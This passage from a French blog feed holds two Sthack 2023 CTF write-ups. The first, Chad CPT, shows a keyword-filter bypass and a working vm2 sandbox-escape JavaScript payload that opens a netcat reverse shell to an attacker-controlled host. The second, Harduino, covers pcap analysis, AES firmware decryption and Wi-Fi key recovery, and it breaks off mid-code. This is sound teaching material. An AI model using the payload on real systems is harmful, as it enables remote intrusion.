&lt;p&gt;Nous pouvons alors proposer des Ã©galitÃ©s telles que &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;test&quot;.length==4&lt;/code&gt; afin de valider la prÃ©sence dâ€™un moteur JavaScript cÃ´tÃ© serveur, et Ã©galement garder en tÃªte la possibilitÃ© dâ€™utiliser des Ã©galitÃ©s pour une potentielle exploitation Ã  lâ€™aveugle.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/sthack2023/chad-cpt/length==4.png&quot; alt=&quot;length==4&quot; class=&quot;img-responsive smallpict&quot; /&gt;&lt;/p&gt;

&lt;p&gt;AprÃ¨s avoir confirmÃ© la prÃ©sence de NodeJS, nous pouvons alors tenter dâ€™exÃ©cuter les fonctions clefs du langage pouvant permettre dâ€™Ã©lever nos privilÃ¨ges. La fonction &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;eval(&amp;lt;instruction&amp;gt;)&lt;/code&gt; fonctionne et parait alors idÃ©ale pour tenter dâ€™exÃ©cuter du code JavaScript sans Ãªtre gÃªnÃ© par lâ€™interprÃ©teur en attente dâ€™un input incluant une opÃ©ration arithmÃ©tique.&lt;/p&gt;

&lt;h2 id=&quot;dÃ©couverte-de-lenvironnement-dexÃ©cution&quot;&gt;DÃ©couverte de lâ€™environnement dâ€™exÃ©cution&lt;/h2&gt;

&lt;p&gt;NodeJS est particuliÃ¨rement riche par ses modules (natifs ou non), mais nous observons que leur import reste impossible, sans savoir si ce sont les modules qui sont introuvables ou lâ€™instruction &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;require&lt;/code&gt; qui est bloquÃ©e :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/sthack2023/chad-cpt/fs.png&quot; alt=&quot;fs&quot; class=&quot;img-responsive smallpict&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nous tentons Ã©galement de crÃ©er un processus Ã  part dans le but dâ€™y injecter une commande systÃ¨me. Cette opÃ©ration est notamment possible via lâ€™utilisation de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;child_process&lt;/code&gt;. Nous notons cependant que lâ€™application rÃ©alise un contrÃ´le sÃ©curitÃ© et va alors bloquer toute requÃªte contenant le mot clef &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;process&lt;/code&gt; avant mÃªme de lâ€™interprÃ©ter.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/sthack2023/chad-cpt/process.png&quot; alt=&quot;process&quot; class=&quot;img-responsive smallpict&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Pour contourner ce blocage, nous pouvons alors dynamiquement diviser et concatÃ©ner le mot de la maniÃ¨re suivante : &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;pro&quot;+&quot;cess&quot;&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/sthack2023/chad-cpt/pro+cess.png&quot; alt=&quot;pro+cess&quot; class=&quot;img-responsive smallpict&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Le message dâ€™erreur disparait, le contournement est alors fonctionnel.&lt;/p&gt;

&lt;p&gt;Dans des situations dit de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jail&lt;/code&gt;/&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sandbox&lt;/code&gt;, le programme fait en sorte de nous permettre dâ€™exÃ©cuter les commandes natives du langage, tout en empÃªchant lâ€™exÃ©cution de commandes systÃ¨mes sur lâ€™hÃ´te. Notre objectif est alors de gagner des informations sur cet environnement, et en trouver les failles pour en abuser.&lt;/p&gt;

&lt;p&gt;Nous observons alors lâ€™environnement dâ€™exÃ©cutions. NodeJS Ã©tant un langage supportant la philosophie objet, nous tentons de lui faire afficher les propriÃ©tÃ©s de son objet courant &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;this&lt;/code&gt; via &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Object.getOwnPropertyNames(this)&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Nous rÃ©cupÃ©rons alors un grand nombre de propriÃ©tÃ©s de lâ€™objet courant, dont une propriÃ©tÃ© &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;VM2_INTERNAL_STATE_DO_NOT_USE_OR_PROGRAM_WILL_FAIL&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Nous nous informons alors sur &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vm2&lt;/code&gt; et apprenons quâ€™il sâ€™agit dâ€™une sandbox NodeJS :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/sthack2023/chad-cpt/vm2.png&quot; alt=&quot;vm2&quot; class=&quot;img-responsive smallpict&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Une premiÃ¨re hypothÃ¨se est dâ€™observer les mauvaises configurations/utilisations/dÃ©ploiements qui pourraient mener Ã  un Ã©chappement de la sandbox vm2. Cette hypothÃ¨se a fait Å“uvre de trÃ¨s nombreux tests, sans rÃ©sultats.&lt;/p&gt;

&lt;p&gt;Nous observons alors que deux failles ont rÃ©cemment (avril 2023) Ã©tÃ© publiÃ©es :&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;CVE-2023-29017&lt;/li&gt;
  &lt;li&gt;CVE-2023-29199&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Des preuves dâ€™exploitation sont Ã©galement disponibles, ce qui facilite lâ€™exploitation :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/sthack2023/chad-cpt/vm2cve.png&quot; alt=&quot;vm2cve&quot; class=&quot;img-responsive smallpict&quot; /&gt;&lt;/p&gt;

&lt;p&gt;https://gist.github.com/seongil-wi/2a44e082001b959bfe304b62121fb76d&lt;/p&gt;

&lt;p&gt;(Le second POC sâ€™avÃ©rant plus stable pour maintenir une connexion ouverte, la suite de cet article utilisera alors lâ€™exploit ici notÃ© &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vm2_3.9.14_exploit_2.js&lt;/code&gt;).&lt;/p&gt;

&lt;h2 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h2&gt;

&lt;p&gt;Dans ce POC, nous avons tout dâ€™abord la mise en place dâ€™un environnement vm2 minimal, puis lâ€™exÃ©cution de lâ€™exploit :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/sthack2023/chad-cpt/exploit.png&quot; alt=&quot;exploit&quot; class=&quot;img-responsive smallpict&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nous rÃ©cupÃ©rons alors la partie surlignÃ©e ci-dessus. Les modifications Ã  appliquer sont les suivantes :&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Remplacer &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;touch flag&lt;/code&gt; par une commande qui nous intÃ©resse. Nous souhaitons obtenir un accÃ¨s au systÃ¨me, la commande NetCat &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc &amp;lt;IP_serveur_attaquant&amp;gt; &amp;lt;port_serveur_attaquant&amp;gt; -e /bin/sh&lt;/code&gt; sera alors sÃ©lectionnÃ©e pour un reverse-shell.&lt;/li&gt;
  &lt;li&gt;Couper les chaÃ®nes contenant le mot Â« process Â» pour permettre de contourner la protection en place.&lt;/li&gt;
  &lt;li&gt;Faire un oneliner JavaScript pour Ã©viter les problÃ¨mes liÃ©s au retour Ã  la ligne&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Voici le code dâ€™exploitation final :&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
Error.prepareStackTrace = (e, frames) =&amp;gt; { var a=&quot;child_pro&quot;+&quot;cess&quot;; var b=&quot;return pro&quot;+&quot;cess&quot;; frames.constructor.constructor(b)().mainModule.require(a).execSync(&apos;nc &amp;lt;IP_serveur_distant&amp;gt; &amp;lt;port_serveur_distant&amp;gt; -e /bin/sh&apos;); }; async function aa(){eval(&quot;1=1&quot;)} aa()

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Nous initialisons Ã©galement un serveur NetCat en Ã©coute sur Internet via la commande &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc -lvp &amp;lt;port&amp;gt;&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Lâ€™envoi du payload permet alors de rÃ©cupÃ©rer un shell sur le serveur distant :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/sthack2023/chad-cpt/nc.png&quot; alt=&quot;nc&quot; class=&quot;img-responsive smallpict&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;phase-de-post-exploitation&quot;&gt;Phase de post-exploitation&lt;/h2&gt;

&lt;p&gt;Nous remarquons que nous sommes connectÃ©s sur le serveur en tant que &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;appuser&lt;/code&gt;, aprÃ¨s quelques recherches dans les diffÃ©rents dossiers, nous relisons Ã  tÃªte reposÃ©e lâ€™Ã©noncÃ© : il faut trouver les accÃ¨s Ã  une &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;base de donnÃ©es&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Nous trouvons un premier indice dans le fichier &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt;, un utilisateur &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;redis&lt;/code&gt; est prÃ©sent. Nous savons donc maintenant quâ€™une base redis est utilisÃ©e, lâ€™exÃ©cution de la commande &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;env&lt;/code&gt;, listant les variables dâ€™environnement, nous permet de nous conforter dans cette hypothÃ¨se :&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
appuser@202035c4bee1:/app$ env
env
REDIS_URL=redis://redis:6379/2
HOSTNAME=202035c4bee1
YARN_VERSION=1.22.19
PWD=/app
HOME=/home/appuser
LS_COLORS=
SHLVL=1
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
NODE_VERSION=19.9.0
_=/usr/bin/env

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Nous nous connectons sur le port 6379 hÃ©bergeant le service redis, la connexion fonctionne :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/sthack2023/chad-cpt/redis.png&quot; alt=&quot;redis&quot; class=&quot;img-responsive smallpict&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Il ne nous reste plus quâ€™Ã  y retrouver le flag â€¦&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/sthack2023/chad-cpt/flag.png&quot; alt=&quot;flag&quot; class=&quot;img-responsive smallpict&quot; /&gt;&lt;/p&gt;

&lt;p&gt;â€¦ et valider lâ€™Ã©preuve.&lt;/p&gt;</content><author><name></name></author><category term="Sthack-2023" /><summary type="html">Chad CPT Introduction</summary></entry><entry><title type="html">Harduino</title><link href="http://localhost:4000/sthack-2023/Harduino.html" rel="alternate" type="text/html" title="Harduino" /><published>2023-05-12T00:00:00+02:00</published><updated>2023-05-12T00:00:00+02:00</updated><id>http://localhost:4000/sthack-2023/Harduino</id><content type="html" xml:base="http://localhost:4000/sthack-2023/Harduino.html">&lt;h1 id=&quot;harduino-writeup&quot;&gt;Harduino writeup&lt;/h1&gt;

&lt;h2 id=&quot;prÃ©ambule&quot;&gt;PrÃ©ambule&lt;/h2&gt;

&lt;p&gt;&lt;em&gt;Arduino est la marque dâ€™une plateforme de prototypage open-source qui permet aux utilisateurs de crÃ©er des objets Ã©lectroniques interactifs Ã  partir de cartes Ã©lectroniques matÃ©riellement libres sur lesquelles se trouve un microcontrÃ´leur.&lt;/em&gt; &lt;a href=&quot;https://fr.wikipedia.org/wiki/Arduino&quot;&gt;WikipÃ©dia&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Le nom du challenge nous donne une indication sur certains Ã©lÃ©ments du challenge. Nous allons sÃ»rement a un certain point avoir Ã  faire Ã  une carte Arduino.&lt;/p&gt;

&lt;h2 id=&quot;analyse-du-pcapng&quot;&gt;Analyse du Pcapng&lt;/h2&gt;

&lt;p&gt;Â Le challenge commence avec un fichier pcapng que nous ouvrons avec Wireshark.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/sthack2023/harduino/tcp_dump_github.png&quot; alt=&quot;&quot; class=&quot;img-responsive smallpict&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nous observons une requÃªte HTTP vers un Github ainsi que diffÃ©rents Ã©changes TCP.&lt;/p&gt;

&lt;p&gt;La page Github est la suivante :&lt;/p&gt;

&lt;p&gt;https://github.com/crazyhardwaredev/harduino_loader/releases/download/ClosedSource/harduino_OTA&lt;/p&gt;

&lt;h2 id=&quot;page-github&quot;&gt;Page Github&lt;/h2&gt;

&lt;p&gt;Nous allons donc Ã©tudier le repo github :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/sthack2023/harduino/github.png&quot; alt=&quot;github&quot; class=&quot;img-responsive smallpict&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nous observons 4 commits et une release. La release a pour titre â€œClosed sourceâ€ cela signifie que les sources ne sont pas fournies et que seul un binaire est prÃ©sent. Nous analysons donc lâ€™historique des commits.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/sthack2023/harduino/commits.png&quot; alt=&quot;commits&quot; class=&quot;img-responsive smallpict&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Le premier commit contient du code en Rust qui a ensuite Ã©tÃ© supprimÃ© lors du troisiÃ¨me commit.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/sthack2023/harduino/first_commit.png&quot; alt=&quot;first_commit&quot; class=&quot;img-responsive smallpict&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Le premier commit contient donc un code effectuant une connexion TCP locale et envoyant un fichier binaire (ici &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/id&lt;/code&gt;) aprÃ¨s lâ€™avoir chiffrÃ© en AES 128. Des valeurs de clÃ© et dâ€™IV sont Ã©galement fournies. Ces valeurs sont nÃ©cessaires au dÃ©chiffrement.&lt;/p&gt;

&lt;p&gt;Nous rÃ©cupÃ©rons Ã©galement le fichier de release :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/sthack2023/harduino/release.png&quot; alt=&quot;release&quot; class=&quot;img-responsive smallpict&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Le fichier de release est appelÃ© harduino_OTA. Dans le monde de lâ€™Ã©lectronique embarquÃ©e &lt;a href=&quot;&quot;&gt;&lt;/a&gt;OTA signifie &lt;em&gt;Over The Air&lt;/em&gt;, dans ce cas on parle dâ€™OTA update ou mise Ã  jour Ã  distance. Le projet Ã©tant Ã©galement nommÃ© harduino_loader et un loader Ã©tant un systÃ¨me de chargement de programme pour microcontrÃ´leur nous pouvons dÃ©duire que le code Rust vu prÃ©cÃ©demment est celui qui a gÃ©nÃ©rÃ© ce binaire.&lt;/p&gt;

&lt;p&gt;Nous vÃ©rifions le fichier rÃ©cupÃ©rÃ© :&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file harduino_OTA
harduino_OTA: ELF 64-bit LSB pie executable, x86-64, version 1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SYSV&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;b37e83597ddd7e5c382d3fe3c847cb5dbc1e289f, &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;GNU/Linux 4.4.0, stripped
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Le fichier est bien un binaire Linux ELF x86. La valeur stripped Ã  la fin indique que les symboles ne sont pas prÃ©sents dans le fichier et quâ€™il a donc Ã©tÃ© compilÃ© en mode release.&lt;/p&gt;

&lt;h2 id=&quot;analyse-du-fichier-binaire&quot;&gt;Analyse du fichier binaire&lt;/h2&gt;

&lt;p&gt;Nous analysons le fichier binaire dans binary-ninja.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/sthack2023/harduino/main.png&quot; alt=&quot;main&quot; class=&quot;img-responsive smallpict&quot; /&gt;&lt;/p&gt;

&lt;p&gt;La fonction main est trÃ¨s courte mais contient un appel vers la fonction sub_9c20 qui elle-mÃªme contient la logique du programme.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/sthack2023/harduino/sub_9c20.png&quot; alt=&quot;sub_9c20&quot; class=&quot;img-responsive smallpict&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nous retrouvons la logique de lâ€™application avec le chargement du firmwarre harduino.&lt;/p&gt;

&lt;p&gt;Pour mieux comprendre le code nous dÃ©cidons de compiler le code trouvÃ© dans lâ€™historique des commits du rÃ©po github.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/sthack2023/harduino/notre_binaire.png&quot; alt=&quot;notrebinaire&quot; class=&quot;img-responsive smallpict&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nous retrouvons donc que la fonction appelÃ©e avant le chargement du fichier est celle dâ€™initialisation du chiffrement et que la clÃ© et lâ€™IV sont concatÃ©nÃ©s.&lt;/p&gt;

&lt;p&gt;Nous regardons donc les valeurs des champs data_45055 et data_45065:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/sthack2023/harduino/key_IV.png&quot; alt=&quot;key_IV&quot; class=&quot;img-responsive smallpict&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nous retrouvons donc les 32 bytes de donnÃ©es formant la clÃ© et le vecteur dâ€™initialisation du chiffrement.&lt;/p&gt;

&lt;p&gt;Nous allons donc rÃ©cupÃ©rer le firmware uploadÃ©.&lt;/p&gt;

&lt;h2 id=&quot;rÃ©cupÃ©ration-et-dÃ©chiffrement-du-firmware&quot;&gt;RÃ©cupÃ©ration et dÃ©chiffrement du firmware&lt;/h2&gt;

&lt;p&gt;De retour dans Wireshark nous cherchons la communication TCP locale sur le port 1337 comme indiquÃ© dans le code trouvÃ©. Une fois cet Ã©change trouvÃ©, nous rÃ©cupÃ©rons le fichier en effectuant un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;clic droit &amp;gt; Follow &amp;gt; TCP stream&lt;/code&gt; que nous affichons en raw.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/sthack2023/harduino/firmware.png&quot; alt=&quot;firmware_chiffrÃ©&quot; class=&quot;img-responsive smallpict&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nous copions le contenu ainsi rÃ©cupÃ©rÃ© dans un fichier et Ã  lâ€™aide dâ€™un code Python et des clÃ© et IV rÃ©cupÃ©rÃ©s nous dÃ©chiffrons le binaire.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;Crypto.Cipher&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AES&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;binascii&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;my_key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;binascii&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;unhexlify&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;87df86f0ba4e95dae94be985609f31a7&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;iv&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;binascii&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;unhexlify&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;6e3329c538cfca39ec3a0742273dad68&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;encryptor&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;my_key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MODE_CBC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IV&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;iv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;file_content&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;dump.raw&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;decrypted&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;encryptor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;binascii&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;unhexlify&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file_content&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;

&lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;firmware.bin&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;wb&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decrypted&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;   
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Nous retrouvons bien un exÃ©cutable ARM dans le fichier firmware.bin&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file firmware.bin 
firmware.bin: ELF 32-bit LSB executable, ARM, EABI5 version 1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SYSV&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, statically linked, with debug_info, not stripped
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Nous analysons alors le fichier rÃ©cupÃ©rÃ©.&lt;/p&gt;

&lt;h2 id=&quot;analyse-du-firmware&quot;&gt;Analyse du firmware&lt;/h2&gt;

&lt;p&gt;Le firmware nâ€™est pas strippÃ© donc les mÃ©thodes sont prÃ©sentes :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/sthack2023/harduino/firmware_methods.png&quot; alt=&quot;firmware methods&quot; class=&quot;img-responsive smallpict&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Cela nous permet de nous rendre facilement dans la fonction setup qui initialise le microcontrÃ´leur.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/sthack2023/harduino/firmware_create_Ap.png&quot; alt=&quot;firmware AP&quot; class=&quot;img-responsive smallpict&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nous retrouvons donc la fonction beginAP indiquant le SSID MyAccessPoint ainsi quâ€™un mot de passe. Cependant r1_8, la variable contenant le mot de passe au moment de la crÃ©ation de lâ€™AP, a subi des modifications par rapport Ã  la valeur vu dans le memcpy.&lt;/p&gt;

&lt;p&gt;Nous rÃ©cupÃ©rons donc le code C du dÃ©-compilateur et remplaÃ§ons les mÃ©thodes Arduino par des mÃ©thodes C standard pour rÃ©cupÃ©rer la clÃ© une fois ces modifications effectuÃ©es.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;**&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;

    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;var_50&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x2a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;// 42&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cle_wifi&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Z7cX_Ud-3A5E&apos;1m)=?cJU664&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;len_cle&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cle_wifi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

          &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r1_8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;var_50&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;len_cle&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; 